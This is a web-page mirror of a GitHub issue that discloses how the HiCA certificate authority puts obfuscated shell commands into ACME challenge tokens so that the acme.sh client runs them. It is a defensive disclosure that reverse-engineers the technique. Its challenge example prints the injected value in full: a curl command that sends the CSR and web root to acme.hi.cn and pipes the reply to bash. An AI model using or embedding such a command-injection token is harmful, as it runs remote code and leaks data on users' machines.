<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://github.com/acmesh-official/acme.sh/issues/4659">Original</a>
    <h1>Acme.sh runs arbitrary commands from a remote server</h1>
    
    <div id="readability-page-1" class="page"><div disabled="" sortable="">
<div>
          <p dir="auto">Hello,</p>
<p dir="auto">You may already be aware of this, but <a href="https://www1.hi.cn/en/" rel="nofollow">HiCA</a> is injecting arbitrary code/commands into the certificate obtaining process and acme.sh is running them on the client machine. I am not sure if this is intentional, expected by users, or safe/unsafe. But I&#39;m documenting my findings for the public to be aware of with this CA.</p>
<p dir="auto">HiCA&#39;s documentation explains that it only supports acme.sh as a client. This was curious to me so I tried to learn why, if it is using ACME (and the ACME logo!) it should be basically compatible with the majority of ACME clients. While obtaining a certificate using <a href="https://github.com/mholt/acmez">ACMEz</a>, <a href="https://twitter.com/mholt6/status/1666897779564892160" rel="nofollow">I discovered</a> that the Directory was blocked unless the User-Agent is set to a string that starts with <code>Mozilla</code> or <code>acme.sh/2.8.2 (https://github.com/Neilpang/acme.sh)</code>. (Firefox loaded the directory just fine, which is surprising because Firefox is not acme.sh.) (I also noticed that <code>caaIdentities</code> includes a variety of CAs including Google Trust Services and SSL.com. Curious.)</p>
<p dir="auto">Once I faked the UA in my own client and got that working, issuance still failed. Curiously, the error message involved trying a URL of <code>../pki-validation</code>. This doesn&#39;t make any sense to me <a href="https://www1.hi.cn/en/docs/tutorial-expert/challenge/http-challenge" rel="nofollow">even though that kind of appears in their docs</a> because it is not standard ACME, so I dug a little deeper to figure out what the Challenge object consisted of that would cause my client to try making a request to <code>../pki-validation</code>.</p>
<p dir="auto">It turns out that the Challenge objects look unusual. Here&#39;s a lightly-formatted example:</p>
<div dir="auto" data-snippet-clipboard-copy-content="{
    Type: http-01
    URL: ../pki-validation
    Status: pending
    Token: dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`-sF`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`https$(IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#
    KeyAuthorization: dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`-sF`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`https$(IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.GfCBN3dYnfNB-Hj1nBYek89o9ohtt9K59uacS13wigw
}"><pre><span>{</span>
    <span>Type</span>: <span>http-01</span>
    <span>URL</span>: <span>../pki-validation</span>
    <span>Status</span>: <span>pending</span>
    <span>Token</span>: <span>dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`-sF`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`https$(IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#</span>
    <span>KeyAuthorization</span>: <span>dd#acme.hi.cn/acme/v2/precheck-http/123456/654321#http-01#/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`-sF`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`https$(IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;Oi8v)acme.hi.cn/acme/csr/http/123456/654321?o=$_w|bash)#.GfCBN3dYnfNB-Hj1nBYek89o9ohtt9K59uacS13wigw</span>
<span>}</span></pre></div>
<p dir="auto">Now it became immediately obvious to my why HiCA only supports acme.sh. They are not conforming to ACME at all! (Bugs the heck outa me that <a href="https://www1.hi.cn/en/docs/intro" rel="nofollow">they&#39;re using the official ACME logo on their site</a> even though they don&#39;t implement the ACME standard.)</p>
<p dir="auto">Instead, <strong>HiCA is stealthily crafting <code>curl</code> commands and piping the output to <code>bash</code>. acme.sh is (being tricked into?) running arbitrary code from a remote server.</strong> <g-emoji alias="exclamation" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2757.png">‚ùó</g-emoji></p>
<p dir="auto">Here&#39;s my analysis so far:</p>
<p dir="auto">The Token string is NOT in conformance with RFC 8555, which states: &#34;the token for a challenge is a string comprised entirely of characters in the URL safe base64 alphabet.&#34; (<code>#</code> is not URL-safe).</p>
<p dir="auto">However you can tell they&#39;re abusing this Token string to encode structure that can be parsed by splitting on &#34;#&#34;:</p>
<ul dir="auto">
<li>I&#39;m not sure what &#34;dd&#34; means. I do have a file called <code>/tmp/$(curl`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`-sF`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`csr=@$csr`IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;IA==`https$(IFS=^;cmd=base64^-d;$cmd&lt;&lt;&lt;Oi8v)acme.hi.cn/acme/csr/http/123456/654321\?o\=\$_w\|bash\)/.well-known/acme-challenge/dd</code> after running acme.sh for a test domain though. It contains the value &#34;dd&#34;...</li>
<li>The next part is clearly a URL to a &#34;precheck-http&#34; resource for this challenge. It returns an error &#34;csr not submitted&#34; if you try to request them before running the <code>csr/http</code> endpoint successfully. I haven&#39;t crafted a successful request to this endpoint yet.</li>
<li>The next part of the token is the challenge type, http-01 in this case.</li>
<li>The part starting with &#34;/tmp/&#34; is a path to a temporary folder or file. A curl command is crafted by inline scripts that write &#34; &#34; (space) and &#34;://&#34; by base64-decoding &#34;IA==&#34; and &#34;Oi8v&#34; respectively. The result is a command like <code>curl -sF csr=@... https://...?o=$_w</code>. In other words, it sends the CSR (provided by acme.sh variable <code>$csr</code>) and your web root to the CA and then pipes the response of that command straight into bash and acme.sh runs it. <g-emoji alias="grimacing" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62c.png">üò¨</g-emoji> <del>I am hoping you could help me craft a request to see the contents of the script that is being run. It seems to involve writing to the disk since <code>o</code> (output?) contains the webroot (the value of <code>$_w</code> in acme.sh).</del> UPDATE: <a href="https://twitter.com/aleksejspopovs/status/1666955050696966148" rel="nofollow">Aleksejs Popovs has extracted the remote script and verified that it does get executed in a VM.</a></li>
<li>Another obvious concern is the Token is supposed to contain at least 128 bits of entropy <em>without client influence</em>. See RFC 8555 section 11.3:
<blockquote>
<p dir="auto">&#34;First, the ACME client should not be able to influence the ACME server&#39;s choice of token as this may allow an attacker to reuse a domain owner&#39;s previous challenge responses for a new validation request.&#34;</p>
</blockquote>
</li>
<li>Error responses come with a 200 status and application/json Content-Type in violation of RFC 8555 (and HTTP convention). This makes it tedious to correctly handle errors. Only &#34;server error&#34; responses return 500.</li>
<li>The second number in the endpoints (654321 in this example) increments for each challenge. So we know how many challenges this CA is experiencing.</li>
</ul>
<p dir="auto">Anyway, this all seems very worrisome to me.</p>
<p dir="auto">I am not sure why HiCA is doing what they are doing. But this intentional deviation from RFC 8555 and the lack of transparency on their docs is suspicious and concerning.</p>
<p dir="auto">I am not sure if it is intentional that acme.sh is allowing arbitrary commands from a remote server to execute.</p>
<p dir="auto">Hopefully this is helpful and maybe you can provide some insight and recommendations.</p>
      </div>
</div></div>
  </body>
</html>
